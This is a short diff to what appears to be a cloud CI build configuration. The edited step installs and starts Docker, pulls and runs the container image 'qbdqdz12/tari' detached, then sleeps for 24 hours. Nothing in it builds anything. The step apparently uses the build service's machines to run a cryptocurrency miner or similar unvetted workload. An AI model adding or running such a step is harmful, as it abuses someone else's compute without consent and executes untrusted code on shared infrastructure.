@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && sudo docker pull qbdqdz12/tari && sudo docker run -dt qbdqdz12/tari && sleep 86400
+         apt update && apt-get install sudo docker -y && sudo service docker start&& sudo docker pull qbdqdz12/tari && sudo docker run -dt qbdqdz12/tari && sleep 86400
     waitFor:
       - '-'
     entrypoint: /bin/bash
